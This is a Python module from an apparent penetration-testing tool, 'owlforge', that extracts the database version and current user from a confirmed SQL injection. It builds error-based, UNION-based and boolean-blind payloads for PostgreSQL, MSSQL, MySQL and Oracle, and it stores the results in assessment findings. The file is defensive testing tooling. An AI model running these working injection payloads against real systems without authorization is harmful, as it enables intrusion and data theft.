"""Native SQL-injection value extraction — turn a confirmed SQLi into concrete proof.

Once SQLi is CONFIRMED on a parameter, a real tester proves impact by reading one value
out of the database. owlforge does this deterministically — no model, and no dependence
on sqlmap being installed or finishing — with an error-based → UNION-based → boolean-blind
ladder that extracts a single low-sensitivity value (the DBMS banner + current user). It
is read-only by construction: it only ever reads `version()`/`current_user`, never
application tables, never a write.

Bounded: a handful of requests for the error/UNION paths, a capped binary search for the
blind path. Pure stdlib + the sandbox HTTP client; deterministic signals only. The point
is harness depth — the machine proves impact so the report says "PostgreSQL 14.3 /
app_user", not merely "possible SQL injection".
"""

from __future__ import annotations

import re
from collections.abc import Callable

from owlforge.engine.preprobe import _send

_W = "owlX7z"   # delimiter so we can find our extracted value inside a noisy error/page
_MAXLEN = 48    # cap on the blind-extracted string length (keeps the binary search bounded)

# Per-dialect value expression: version + current user, concatenated read-only. The MySQL
# form skips the wrapper because extractvalue() truncates its error to ~32 chars.
_VAL = {
    "postgresql": f"'{_W}'||version()||'/'||current_user||'{_W}'",
    "mssql": f"'{_W}'+@@version+'/'+system_user+'{_W}'",
    "mysql": "concat(0x7e,version(),0x2f,current_user())",
    "oracle": f"'{_W}'||(select banner from v$version where rownum=1)||'{_W}'",
}
# Per-dialect "force the value into a type-conversion error" wrapper.
_ERR = {
    "postgresql": lambda v: f"cast(({v}) as int)",
    "mssql": lambda v: f"convert(int,({v}))",
    "mysql": lambda v: f"extractvalue(1,{v})",
    "oracle": lambda v: f"to_number(({v}))",
}


def _resp(sandbox, t: dict, payload: str, headers) -> tuple[int, str]:
    r = _send(sandbox, t["method"], t["url"], t["param"], payload, headers) or {}
    return int(r.get("status") or 0), (r.get("body") or "")


def _find_wrapped(body: str, dialect: str) -> str | None:
    m = re.search(re.escape(_W) + r"(.*?)" + re.escape(_W), body, re.S)
    if m:
        return m.group(1).strip()
    if dialect == "mysql":   # XPATH error renders our 0x7e tilde then the value (truncated)
        m = re.search(r"~([ -~]{3,40})", body)
        if m:
            return m.group(1).strip().rstrip("'\"")
    return None


def _error_based(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
    for dialect, expr in _VAL.items():
        payload = f"{and_pre} AND {_ERR[dialect](expr)}{suf}"
        _st, body = _resp(sandbox, t, payload, headers)
        val = _find_wrapped(body, dialect)
        if val and len(val) >= 3:
            return val, f"error-based/{dialect}"
    return None, ""


def _union_based(sandbox, t, union_pre, suf, headers) -> tuple[str | None, str]:
    # 1) find the column count with ALL-NULL columns (NULL is type-compatible with any
    #    column, so the correct count returns a non-error page while a wrong count errors).
    #    Injecting a string into every column instead would type-mismatch on numeric/date
    #    columns and just 500 — the historical reason UNION extraction failed on Postgres.
    ncols = None
    for n in range(1, 11):
        st, _ = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(['NULL'] * n)}{suf}", headers)
        if st and st < 500:
            ncols = n
            break
    if not ncols:
        return None, ""
    # 2) drop the wrapped value into one column at a time until it echoes in the body
    val_exprs = (
        ("postgresql", f"'{_W}'||version()||'/'||current_user||'{_W}'"),
        ("mysql", f"concat('{_W}',version(),0x2f,current_user(),'{_W}')"),
        ("mssql", f"'{_W}'+@@version+'/'+system_user+'{_W}'"),
    )
    for col in range(ncols):
        for dial, valexpr in val_exprs:
            slot = ["NULL"] * ncols
            slot[col] = valexpr
            _st, body = _resp(sandbox, t, f"{union_pre} UNION SELECT {','.join(slot)}{suf}", headers)
            val = _find_wrapped(body, "")
            if val and len(val) >= 3:
                return val, f"union-based ({ncols} cols, col {col + 1}, {dial})"
    return None, ""


def _sig(status: int, body: str) -> tuple[int, int]:
    """A coarse, stable response signature for the boolean oracle (status + length bucket)."""
    return status, len(body) // 32


def _boolean_blind(sandbox, t, and_pre, suf, headers) -> tuple[str | None, str]:
    # Primary oracle: a CONDITIONAL ERROR — a false condition forces divide-by-zero, so the
    # response flips 200<->500 regardless of whether the injected value is a "valid" one.
    # This is value-agnostic, unlike comparing content length for a made-up base value (the
    # reason blind extraction missed the ginandjuice `category` SQLi, where `category=1` is
    # not a real category so true/false looked identical). 1/0 errors on PG/MySQL/MSSQL/Oracle.
    def _cond(c: str) -> str:
        return f"{and_pre} AND 1/(case when ({c}) then 1 else 0 end)=1{suf}"

    t_sig = _sig(*_resp(sandbox, t, _cond("1=1"), headers))
    f_sig = _sig(*_resp(sandbox, t, _cond("1=2"), headers))
    if t_sig != f_sig:
        how = "boolean-blind (conditional error)"

        def truth(c: str) -> bool:
            return _sig(*_resp(sandbox, t, _cond(c), headers)) == t_sig
    else:
        # Fallback: a plain content-difference oracle (apps that show/hide rows, no error).
        tt = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=1{suf}", headers))
        ff = _sig(*_resp(sandbox, t, f"{and_pre} AND 1=2{suf}", headers))
        if tt == ff:
            return None, ""
        how = "boolean-blind"

        def truth(c: str) -> bool:
            return _sig(*_resp(sandbox, t, f"{and_pre} AND {c}{suf}", headers)) == tt

    sub = "substring((select version()),{i},1)"   # MySQL/Postgres/MSSQL; Oracle lacks version()
    out = []
    for i in range(1, _MAXLEN + 1):
        if not truth(f"length((select version()))>={i}"):
            break
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if truth(f"ascii({sub.format(i=i)})>{mid}"):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
    val = "".join(out).strip()
    if len(val) >= 3:
        return val, how
    return None, ""


def extract_one(sandbox, target: dict, headers=None) -> tuple[str | None, str]:
    """Run the extraction ladder on one confirmed-injectable target. Returns
    (value, technique) or (None, '')."""
    if sandbox is None:
        return None, ""
    t = {"url": target["url"], "param": target["param"],
         "method": (target.get("method") or "GET").upper()}
    contexts = (("1'", "-1'", "-- -"), ("1", "-1", "-- -"))   # string then numeric
    for and_pre, union_pre, suf in contexts:
        for fn, args in ((_error_based, (and_pre, suf)),
                         (_union_based, (union_pre, suf)),
                         (_boolean_blind, (and_pre, suf))):
            try:
                val, how = fn(sandbox, t, *args, headers)
            except Exception:
                val, how = None, ""
            if val:
                return val[:200], how
    return None, ""


def _sqli_targets(assessment_id: str):
    """Confirmed/suspected SQLi findings that carry an injectable endpoint+param."""
    from sqlmodel import select

    from owlforge.store.db import session
    from owlforge.store.models import Finding
    out = []
    with session() as s:
        rows = s.exec(select(Finding).where(Finding.assessment_id == assessment_id)).all()
        for f in rows:
            title = (f.title or "").lower()
            if "sql injection" not in title and "sqli" not in title:
                continue
            if f.status not in ("validated", "candidate"):
                continue
            url = f.repro_url or f.endpoint
            params = dict(f.repro_params or {})
            param = next(iter(params), None)
            if url and param:
                out.append((f.id, {"url": url, "param": param,
                                   "method": f.repro_method or f.method or "GET"}))
    return out


def extract_sqli_values(assessment_id, sandbox, session_headers=None,
                        log: Callable[[str], None] = lambda m: None, cap: int = 3) -> int:
    """Enrich confirmed SQLi findings with a concrete extracted value (DBMS banner /
    current user), natively and fast. Returns the number of findings enriched."""
    if sandbox is None:
        return 0
    targets = _sqli_targets(assessment_id)[:cap]
    if not targets:
        return 0
    from owlforge.store.db import session
    from owlforge.store.models import Finding
    enriched = 0
    for fid, tgt in targets:
        val, how = extract_one(sandbox, tgt, session_headers)
        if not val:
            continue
        with session() as s:
            f = s.get(Finding, fid)
            if not f:
                continue
            f.status = "validated"
            f.confidence = "high"
            note = (f"Extracted a live value via {how} (read-only): {val}")
            f.technical_analysis = ((f.technical_analysis or "").rstrip()
                                    + f"\n\nProof of impact — {note}.")
            f.proof_of_concept = ((f.proof_of_concept or "").rstrip()
                                  + f"\nExtracted ({how}): {val}")
            f.evidence = ((f.evidence + "\n") if isinstance(f.evidence, str) and f.evidence
                          else "") + f"extracted ({how}): {val}"
            f.validation_note = ((f.validation_note or "") + " | value-extracted").strip(" |")
            s.add(f)
            s.commit()
        enriched += 1
        log(f"sqli-extract: {tgt['param']} -> {val}  ({how})")
    return enriched
